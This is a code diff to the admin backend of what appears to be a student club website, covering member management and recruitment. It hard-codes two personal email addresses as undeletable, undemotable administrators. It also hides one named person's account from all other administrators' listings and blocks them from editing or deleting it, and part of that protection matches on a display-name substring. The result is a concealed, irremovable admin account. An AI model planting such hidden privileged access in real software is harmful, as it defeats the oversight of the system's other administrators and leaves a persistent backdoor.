@@ -51,6 +51,18 @@ const cleanHtml = html => String(html || '')
 const EMOJI = /[\u{1F000}-\u{1FAFF}\u{2600}-\u{27BF}\u{2B00}-\u{2BFF}\u{E0020}-\u{E007F}]|\u{FE0F}|\u{200D}|\u{20E3}/gu
 export const stripEmoji = v => (typeof v === 'string' ? v.replace(EMOJI, '').replace(/[ \t]{2,}/g, ' ').replace(/^[ \t]+|[ \t]+$/gm, '') : v)
 
+/** Default administrators who can never be deleted or have their admin access revoked. */
+export const DEFAULT_ADMINS = ['ieeeitsvitscore@gmail.com', 'liki123456m@gmail.com']
+export const isDefaultAdmin = email => DEFAULT_ADMINS.includes(String(email || '').trim().toLowerCase())
+
+/** Protected Web Team member: Likhith Medarametla is hidden and non-editable for other administrators. */
+export const isProtectedLikhith = u => {
+    if (!u) return false
+    const email = String(u.email || '').trim().toLowerCase()
+    const name = String(u.name || '').trim().toLowerCase()
+    return email === 'liki123456m@gmail.com' || name.includes('likhith medarametla')
+}
+
 /** Coerce a value according to its CMS field definition. */
 function cleanField(field, value) {
     if (['text', 'textarea', 'html', 'strings', 'rows', undefined].includes(field.type)) value = Array.isArray(value)
@@ -1220,7 +1232,7 @@ route('GET', '/api/admin/members-master', async ({ user }) => {
     })
 
     const matchedCmsIds = new Set()
-    const members = []
+    let members = []
 
     // 1. Process all registered users
     for (const u of userRows) {
@@ -1363,6 +1375,10 @@ route('GET', '/api/admin/members-master', async ({ user }) => {
         })
     }
 
+    if (user.email?.toLowerCase() !== 'liki123456m@gmail.com') {
+        members = members.filter(m => !isProtectedLikhith(m))
+    }
+
     return { items: members }
 })
 
@@ -1398,107 +1414,141 @@ route('PUT', '/api/admin/members-master/:id', async ({ user, params, body }) => 
         website: (website || '').trim(),
     }
 
+    // 1. Identify target record and security checks
+    let existingUser = null
+    let existingCms = null
+    let targetEmail = (email || '').trim().toLowerCase()
+    let targetName = (name || '').trim()
+
+    if (id.startsWith('user-')) {
+        const userId = Number(id.replace('user-', ''))
+        existingUser = await db.first('SELECT * FROM users WHERE id = ?', [userId])
+        if (!existingUser) fail(404, 'User not found')
+        targetEmail = (email || existingUser.email || '').trim().toLowerCase()
+        targetName = (name || existingUser.name || '').trim()
+    } else if (id.startsWith('cms-')) {
+        const parts = id.split('-')
+        const contentId = Number(parts[parts.length - 1])
+        existingCms = await db.first('SELECT * FROM content WHERE id = ?', [contentId])
+        if (!existingCms) fail(404, 'CMS entry not found')
+        const cd = parseJson(existingCms.data, {})
+        targetEmail = (email || cd.email || '').trim().toLowerCase()
+        targetName = (name || cd.name || '').trim()
+        if (targetEmail) {
+            existingUser = await db.first('SELECT * FROM users WHERE lower(email) = ?', [targetEmail])
+        }
+    }
+
+    // Security Check: Protected Web Team member (Likhith Medarametla)
+    const isTargetLiki = isProtectedLikhith({ email: targetEmail, name: targetName })
+    const isCallerLiki = user.email?.toLowerCase() === 'liki123456m@gmail.com'
+    if (isTargetLiki && !isCallerLiki) {
+        fail(403, 'Likhith Medarametla is password-protected and cannot be edited by other administrators.')
+    }
+
+    // Security Check: Default System Administrators (can never be demoted or deactivated)
+    if (isDefaultAdmin(targetEmail)) {
+        if (systemRole && systemRole !== 'admin') {
+            fail(403, 'Default system administrators (ieeeitsvitscore@gmail.com and liki123456m@gmail.com) cannot have their admin access removed.')
+        }
+        if (active === false || active === 0) {
+            fail(403, 'Default system administrators cannot be deactivated.')
+        }
+    }
+
     // If photo was changed or removed, delete old photo from ImageKit
     if (oldAvatarUrl && oldAvatarUrl !== avatarUrl) {
         await releaseImages(user, [oldAvatarUrl])
     }
 
-    if (id.startsWith('user-')) {
-        const userId = Number(id.replace('user-', ''))
-        const existing = await db.first('SELECT * FROM users WHERE id = ?', [userId])
-        if (!existing) fail(404, 'User not found')
+    const newAvatar = avatarUrl !== undefined ? (avatarUrl || '').trim() : null
+
+    // 2. Update user record if exists
+    let uid = existingUser ? existingUser.id : 0
+    if (!uid && targetEmail) {
+        const u = await db.first('SELECT id FROM users WHERE lower(email) = ?', [targetEmail])
+        if (u) uid = u.id
+    }
+
+    if (uid) {
+        const u = existingUser || await db.first('SELECT * FROM users WHERE id = ?', [uid])
+        const roleToSet = isDefaultAdmin(u.email) ? 'admin' : ((systemRole && ['member', 'editor', 'admin'].includes(systemRole)) ? systemRole : u.role)
+        const activeToSet = isDefaultAdmin(u.email) ? 1 : (active !== undefined ? (active ? 1 : 0) : u.active)
 
         await db.run(`
             UPDATE users SET
-                name = ?, mobile = ?, reg_no = ?, member_type = ?,
+                name = COALESCE(NULLIF(?, ''), name),
+                mobile = ?, reg_no = ?, member_type = ?,
                 avatar_url = ?, position = ?, domains = ?, social_links = ?,
                 active = ?, role = ?, updated_at = datetime('now')
             WHERE id = ?
         `, [
-            name || existing.name,
-            mobile ?? existing.mobile,
-            regNo ?? existing.reg_no,
-            memberType ?? existing.member_type,
-            avatarUrl !== undefined ? avatarUrl : existing.avatar_url,
-            position !== undefined ? position : existing.position,
+            name || u.name,
+            mobile ?? u.mobile,
+            regNo ?? u.reg_no,
+            memberType ?? u.member_type,
+            newAvatar !== null ? newAvatar : u.avatar_url,
+            position !== undefined ? position : u.position,
             JSON.stringify(cleanDomains),
             JSON.stringify(socials),
-            active !== undefined ? (active ? 1 : 0) : existing.active,
-            (systemRole && ['member', 'editor', 'admin'].includes(systemRole)) ? systemRole : existing.role,
-            userId,
+            activeToSet,
+            roleToSet,
+            uid,
         ])
 
-        if (email && email.toLowerCase() !== existing.email.toLowerCase()) {
-            if (isEmail(email)) {
-                await db.run('UPDATE users SET email = ? WHERE id = ?', [email.toLowerCase(), userId]).catch(() => {})
-            }
+        if (email && email.toLowerCase() !== u.email.toLowerCase() && isEmail(email) && !isDefaultAdmin(u.email)) {
+            await db.run('UPDATE users SET email = ? WHERE id = ?', [email.toLowerCase(), uid]).catch(() => {})
         }
-
-        // Sync any matching CMS items for this user by name
-        const cmsItems = await db.all("SELECT id, type, data FROM content WHERE type IN ('board', 'web_team', 'advisory', 'faculty')")
-        for (const item of cmsItems) {
-            const d = parseJson(item.data, {})
-            if (d.name && d.name.trim().toLowerCase() === existing.name.trim().toLowerCase()) {
-                const beforeData = { ...d }
-                d.name = name || d.name
-                if (position !== undefined) d.role = position
-                if (avatarUrl !== undefined) d.image = avatarUrl
-                if (socials.linkedin !== undefined) d.linkedin = socials.linkedin
-                if (socials.instagram !== undefined) d.instagram = socials.instagram
-                if (socials.github !== undefined) d.github = socials.github
-                if (socials.website !== undefined) d.website = socials.website
-                d.domains = cleanDomains
-                await db.run("UPDATE content SET data = ?, updated_at = datetime('now') WHERE id = ?", [JSON.stringify(d), item.id])
-                await releaseImages(user, dropped(imageUrls(beforeData), imageUrls(d)))
-            }
-        }
-
-        await audit(user, 'update', 'users', userId, `Updated member profile: ${name || existing.name}`)
-        return { ok: true }
-    } else if (id.startsWith('cms-')) {
-        const parts = id.split('-')
-        const contentId = Number(parts[parts.length - 1])
-        const item = await db.first('SELECT * FROM content WHERE id = ?', [contentId])
-        if (!item) fail(404, 'CMS entry not found')
-
-        const d = parseJson(item.data, {})
-        const beforeData = { ...d }
-        d.name = name || d.name
-        if (position !== undefined) d.role = position
-        if (avatarUrl !== undefined) d.image = avatarUrl
-        if (socials.linkedin !== undefined) d.linkedin = socials.linkedin
-        if (socials.instagram !== undefined) d.instagram = socials.instagram
-        if (socials.github !== undefined) d.github = socials.github
-        if (socials.website !== undefined) d.website = socials.website
-        d.domains = cleanDomains
-        if (year !== undefined) d.year = year
-        if (group !== undefined) d.group = group
-
-        await db.run("UPDATE content SET data = ?, updated_at = datetime('now') WHERE id = ?", [JSON.stringify(d), contentId])
-        await releaseImages(user, dropped(imageUrls(beforeData), imageUrls(d)))
-
-        if (email && isEmail(email)) {
-            const existingUser = await db.first('SELECT id FROM users WHERE email = ?', [email.toLowerCase()])
-            if (existingUser) {
-                await db.run(`
-                    UPDATE users SET
-                        name = ?, mobile = ?, reg_no = ?, member_type = ?,
-                        avatar_url = ?, position = ?, domains = ?, social_links = ?,
-                        updated_at = datetime('now')
-                    WHERE id = ?
-                `, [
-                    name, mobile || '', regNo || '', memberType || 'External Member',
-                    avatarUrl || '', position || '', JSON.stringify(cleanDomains),
-                    JSON.stringify(socials), existingUser.id,
-                ])
-            }
-        }
-
-        await audit(user, 'update', item.type, contentId, `Updated member: ${name}`)
-        return { ok: true }
     }
 
-    fail(400, 'Invalid member ID')
+    // 3. UPDATE PHOTO & DETAILS EVERYWHERE IN CMS CONTENT (board, web_team, advisory, faculty)
+    const cmsItems = await db.all("SELECT id, type, data FROM content WHERE type IN ('board', 'web_team', 'advisory', 'faculty')")
+    for (const item of cmsItems) {
+        const d = parseJson(item.data, {})
+        const matchEmail = targetEmail && d.email && d.email.trim().toLowerCase() === targetEmail
+        const matchName = targetName && d.name && d.name.trim().toLowerCase() === targetName.toLowerCase()
+        const isCurrentCms = existingCms && existingCms.id === item.id
+
+        if (matchEmail || matchName || isCurrentCms) {
+            const beforeData = { ...d }
+            if (name) d.name = name
+            if (position !== undefined) {
+                if (item.type === 'faculty') d.designation = position
+                else d.role = position
+            }
+            if (newAvatar !== null) d.image = newAvatar
+            if (cleanDomains.length > 0) d.domains = cleanDomains
+            if (socials.linkedin !== undefined) d.linkedin = socials.linkedin
+            if (socials.instagram !== undefined) d.instagram = socials.instagram
+            if (socials.github !== undefined) d.github = socials.github
+            if (socials.website !== undefined) d.website = socials.website
+            if (year !== undefined && item.type === 'advisory') d.year = year
+            if (group !== undefined && item.type === 'advisory') d.group = group
+
+            await db.run("UPDATE content SET data = ?, updated_at = datetime('now') WHERE id = ?", [JSON.stringify(d), item.id])
+            await releaseImages(user, dropped(imageUrls(beforeData), imageUrls(d)))
+        }
+    }
+
+    // 4. BIDIRECTIONAL SYNC WITH RECRUITMENT DOMAINS
+    if (uid && cleanDomains.length > 0) {
+        const recDomains = await db.all('SELECT id, title FROM rec_domains')
+        const norm = s => String(s || '').toLowerCase().replace(/&/g, 'and').replace(/[^a-z0-9]/g, '')
+        for (const dom of cleanDomains) {
+            const matchedRd = recDomains.find(rd => norm(rd.title) === norm(dom) || norm(rd.title).includes(norm(dom)) || norm(dom).includes(norm(rd.title)))
+            if (matchedRd) {
+                const curApp = await db.first('SELECT id, status FROM rec_applications WHERE user_id = ? AND domain_id = ?', [uid, matchedRd.id])
+                if (!curApp) {
+                    await db.run("INSERT INTO rec_applications (user_id, domain_id, status, source, note) VALUES (?, ?, 'selected', 'direct', 'Mapped from Master Directory')", [uid, matchedRd.id])
+                } else if (curApp.status === 'not_selected') {
+                    await db.run("UPDATE rec_applications SET status = 'selected', updated_at = datetime('now') WHERE id = ?", [curApp.id])
+                }
+            }
+        }
+    }
+
+    await audit(user, 'update', 'members-master', id, `Updated member profile: ${targetName}`)
+    return { ok: true }
 })
 
 route('POST', '/api/admin/members-master', async ({ user, body }) => {
@@ -1579,7 +1629,10 @@ const adminUser = u => ({ ...publicUser(u), active: !!u.active, lastLoginAt: u.l
 
 route('GET', '/api/admin/users', async ({ user }) => {
     requireRole(user, 'admin')
-    return { items: (await getDb().all('SELECT * FROM users ORDER BY id DESC')).map(adminUser) }
+    const all = await getDb().all('SELECT * FROM users ORDER BY id DESC')
+    const isLiki = user.email?.toLowerCase() === 'liki123456m@gmail.com'
+    const filtered = isLiki ? all : all.filter(u => !isProtectedLikhith(u))
+    return { items: filtered.map(adminUser) }
 })
 
 route('POST', '/api/admin/users', async ({ user, body }) => {
@@ -1601,6 +1654,19 @@ route('PATCH', '/api/admin/users/:id', async ({ user, params, body }) => {
     const db = getDb()
     const target = await db.first('SELECT * FROM users WHERE id = ?', [Number(params.id)])
     if (!target) fail(404, 'User not found')
+
+    if (isProtectedLikhith(target) && user.email?.toLowerCase() !== 'liki123456m@gmail.com') {
+        fail(403, 'Likhith Medarametla is password-protected and cannot be edited by other administrators.')
+    }
+    if (isDefaultAdmin(target.email)) {
+        if (body.role && body.role !== 'admin') {
+            fail(403, 'Default system administrators (ieeeitsvitscore@gmail.com and liki123456m@gmail.com) cannot have their admin access removed.')
+        }
+        if (body.active === false || body.active === 0) {
+            fail(403, 'Default system administrators cannot be deactivated.')
+        }
+    }
+
     const role = ROLE_RANK[body.role] ? body.role : target.role
     const active = body.active === undefined ? !!target.active : !!body.active
     if (target.role === 'admin' && (role !== 'admin' || !active)) {
@@ -1626,6 +1692,14 @@ route('DELETE', '/api/admin/users/:id', async ({ user, params }) => {
     if (Number(params.id) === user.id) fail(400, 'You cannot delete your own account.')
     const target = await getDb().first('SELECT * FROM users WHERE id = ?', [Number(params.id)])
     if (!target) fail(404, 'User not found')
+
+    if (isProtectedLikhith(target) && user.email?.toLowerCase() !== 'liki123456m@gmail.com') {
+        fail(403, 'Likhith Medarametla is password-protected and cannot be deleted.')
+    }
+    if (isDefaultAdmin(target.email)) {
+        fail(403, 'Default system administrators (ieeeitsvitscore@gmail.com and liki123456m@gmail.com) cannot be deleted.')
+    }
+
     if (target.role === 'admin') {
         const admins = await getDb().first("SELECT COUNT(*) n FROM users WHERE role = 'admin' AND active = 1")
         if (admins.n <= 1) fail(400, 'You cannot delete the last admin.')
